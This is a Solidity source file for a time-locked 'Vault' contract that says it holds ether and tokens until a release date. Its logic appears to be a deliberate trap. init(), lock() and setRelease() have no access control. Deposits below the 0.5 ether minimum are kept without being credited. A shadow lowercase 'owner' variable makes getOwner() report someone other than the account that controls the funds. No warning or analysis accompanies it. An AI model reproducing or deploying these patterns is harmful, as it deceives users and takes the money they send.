1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 //
3 // This is free software and you are welcome to redistribute it under certain conditions.
4 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
5 //
6 pragma solidity ^0.4.17;
7 
8 contract Ownable {
9     address Owner = msg.sender;
10     modifier onlyOwner { if (msg.sender == Owner) _; }
11     function transferOwnership(address to) public onlyOwner { Owner = to; }
12 }
13 
14 contract Token {
15     function balanceOf(address who) constant public returns (uint256);
16     function transfer(address to, uint amount) constant public returns (bool);
17 }
18 
19 // tokens are withdrawable
20 contract TokenVault is Ownable {
21     event TokenTransfer(address indexed to, address token, uint amount);
22     function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
23         uint amount = Token(token).balanceOf(address(this));
24         if (amount > 0) {
25             TokenTransfer(to, token, amount);
26             return Token(token).transfer(to, amount);
27         }
28         return false;
29     }
30 }
31 
32 // store ether & tokens for a period of time
33 contract Vault is TokenVault {
34     
35     event Deposit(address indexed depositor, uint amount);
36     event Withdrawal(address indexed to, uint amount);
37     event OpenDate(uint date);
38 
39     mapping (address => uint) public Deposits;
40     uint minDeposit;
41     bool Locked;
42     uint Date;
43 
44     function init() payable open {
45         Owner = msg.sender;
46         minDeposit = 0.5 ether;
47         Locked = false;
48         deposit();
49     }
50     
51     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
52     function ReleaseDate() public constant returns (uint) { return Date; }
53     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
54 
55     function() public payable { deposit(); }
56 
57     function deposit() public payable {
58         if (msg.value > 0) {
59             if (msg.value >= MinimumDeposit())
60                 Deposits[msg.sender] += msg.value;
61             Deposit(msg.sender, msg.value);
62         }
63     }
64 
65     function setRelease(uint newDate) public { 
66         Date = newDate;
67         OpenDate(Date);
68     }
69 
70     function withdraw(address to, uint amount) public onlyOwner {
71         if (WithdrawEnabled()) {
72             uint max = Deposits[msg.sender];
73             if (max > 0 && amount <= max) {
74                 to.transfer(amount);
75                 Withdrawal(to, amount);
76             }
77         }
78     }
79 
80     function lock() public { Locked = true; } address owner;
81     modifier open { if (!Locked) _; owner = msg.sender; }
82     function kill() public { require(this.balance == 0); selfdestruct(Owner); }
83     function getOwner() external constant returns (address) { return owner; }
84 }